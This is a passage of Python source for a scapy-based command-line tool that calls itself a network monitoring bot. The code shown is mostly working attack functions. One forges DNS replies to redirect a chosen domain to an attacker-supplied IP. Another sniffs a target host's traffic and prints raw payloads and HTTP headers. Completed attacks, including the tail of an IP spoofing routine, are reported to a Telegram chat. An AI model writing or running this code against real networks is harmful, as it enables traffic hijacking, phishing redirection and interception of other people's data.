            
            # Send to Telegram if configured
            if self.config["telegram_token"] and self.config["telegram_chat_id"]:
                self.send_telegram(f"IP spoofing attack completed:\nSpoofed {spoofed_ip} -> {target_ip}\nPackets sent: {count}")
        except Exception as e:
            print(f"{COLORS[current_theme]['error']}IP spoofing failed: {e}{COLORS[current_theme]['reset']}")
    
    def spoof_dns(self, args):
        """Perform DNS spoofing (redirect domain to different IP)"""
        if len(args) < 2:
            print(f"{COLORS[current_theme]['error']}Usage: dns <domain> <redirect_ip> [count]{COLORS[current_theme]['reset']}")
            return
        
        domain = args[0]
        redirect_ip = args[1]
        count = 10 if len(args) < 3 else int(args[2])
        
        print(f"{COLORS[current_theme]['warning']}Starting DNS spoofing: {domain} -> {redirect_ip}{COLORS[current_theme]['reset']}")
        
        def dns_callback(packet):
            if packet.haslayer(DNSQR):
                dns = packet.getlayer(DNS)
                
                # Check if this is a query for our target domain
                if dns.qr == 0 and domain in str(dns.qd.qname):
                    print(f"{COLORS[current_theme]['info']}Intercepted DNS query for {domain}{COLORS[current_theme]['reset']}")
                    
                    # Create spoofed response
                    spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                                  UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                                  DNS(id=dns.id, qr=1, aa=1, qd=dns.qd,
                                      an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=redirect_ip))
                    
                    send(spoofed_pkt, verbose=False)
                    print(f"{COLORS[current_theme]['success']}Sent spoofed DNS response: {domain} -> {redirect_ip}{COLORS[current_theme]['reset']}")
        
        try:
            print(f"{COLORS[current_theme]['info']}Sniffing for DNS queries... (Press Ctrl+C to stop){COLORS[current_theme]['reset']}")
            sniff(filter="udp port 53", prn=dns_callback, count=count)
            print(f"{COLORS[current_theme]['success']}DNS spoofing completed.{COLORS[current_theme]['reset']}")
            
            # Send to Telegram if configured
            if self.config["telegram_token"] and self.config["telegram_chat_id"]:
                self.send_telegram(f"DNS spoofing completed:\n{domain} now points to {redirect_ip}")
        except Exception as e:
            print(f"{COLORS[current_theme]['error']}DNS spoofing failed: {e}{COLORS[current_theme]['reset']}")
    
    def intercept_packets(self, args):
        """Intercept and analyze packets for a specific IP"""
        if len(args) < 1:
            print(f"{COLORS[current_theme]['error']}Usage: intercept <ip_address> [count]{COLORS[current_theme]['reset']}")
            return
        
        target_ip = args[0]
        count = self.config["packet_sniff_count"] if len(args) < 2 else int(args[1])
        
        print(f"{COLORS[current_theme]['info']}Starting packet interception for {target_ip}...{COLORS[current_theme]['reset']}")
        
        def intercept_callback(packet):
            if IP in packet and (packet[IP].src == target_ip or packet[IP].dst == target_ip):
                timestamp = datetime.fromtimestamp(packet.time).strftime('%Y-%m-%d %H:%M:%S')
                
                # Basic packet info
                src = packet[IP].src
                dst = packet[IP].dst
                proto = packet[IP].proto
                
                # Protocol specific info
                info = ""
                if proto == 6 and TCP in packet:  # TCP
                    info = f"TCP {src}:{packet[TCP].sport} -> {dst}:{packet[TCP].dport} Flags: {packet[TCP].flags}"
                elif proto == 17 and UDP in packet:  # UDP
                    info = f"UDP {src}:{packet[UDP].sport} -> {dst}:{packet[UDP].dport}"
                elif proto == 1 and ICMP in packet:  # ICMP
                    info = f"ICMP {src} -> {dst} Type: {packet[ICMP].type}"
                else:
                    info = f"Protocol {proto} {src} -> {dst}"
                
                print(f"{COLORS[current_theme]['info']}[{timestamp}] {info}{COLORS[current_theme]['reset']}")
                
                # Check for interesting data
                if packet.haslayer(Raw):
                    load = packet[Raw].load
                    try:
                        decoded = load.decode('utf-8', errors='ignore')
                        if len(decoded) > 10:  # Only show if there's substantial data
                            print(f"{COLORS[current_theme]['secondary']}Data: {decoded[:100]}{'...' if len(decoded) > 100 else ''}{COLORS[current_theme]['reset']}")
                    except:
                        pass
                
                # Check for HTTP
                if packet.haslayer(http.HTTPRequest):
                    http_layer = packet.getlayer(http.HTTPRequest)
                    print(f"{COLORS[current_theme]['secondary']}HTTP Request: {http_layer.Method} {http_layer.Host}{http_layer.Path}{COLORS[current_theme]['reset']}")
                    if packet.haslayer(Raw):
                        try:
                            print(f"{COLORS[current_theme]['secondary']}Headers: {str(packet[Raw].load.decode())[:200]}{COLORS[current_theme]['reset']}")
                        except:
                            pass
                
                print()  # Empty line between packets
        
        try:
            sniff(filter=f"host {target_ip}", prn=intercept_callback, count=count)
            print(f"{COLORS[current_theme]['success']}Packet interception completed.{COLORS[current_theme]['reset']}")
        except Exception as e:
            print(f"{COLORS[current_theme]['error']}Packet interception error: {e}{COLORS[current_theme]['reset']}")
    
    def run(self):
        """Main execution loop for the Accurate Cyber Bot"""
        print(f"""{COLORS[current_theme]['primary']}
   ____      _          ____        _   
  / ___|   _| |__   ___| __ )  ___ | |_ 
 | |  | | | | '_ \ / _ \  _ \ / _ \| __|
 | |__| |_| | |_) |  __/ |_) | (_) | |_ 
  \____\__,_|_.__/ \___|____/ \___/ \__|
                                         
{COLORS[current_theme]['secondary']}Accurate Cyber Security Bot - Network Monitoring and Analysis Tool
Type 'help' for available commands
{COLORS[current_theme]['reset']}""")
        
        while self.running:
            try:
                # Get user input
                command_input = input(f"{COLORS[current_theme]['primary']}cyberbot> {COLORS[current_theme]['reset']}").strip()
                
                if not command_input:
                    continue
                
                # Parse command
                parts = command_input.split()
                command = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                # Execute command
                if command in self.command_handlers:
                    self.command_handlers[command](args)
                else:
                    print(f"{COLORS[current_theme]['error']}Unknown command: {command}. Type 'help' for available commands.{COLORS[current_theme]['reset']}")
            
            except KeyboardInterrupt:
                print("\nType 'exit' to quit or 'help' for commands")
            except Exception as e:
                print(f"{COLORS[current_theme]['error']}Error: {e}{COLORS[current_theme]['reset']}")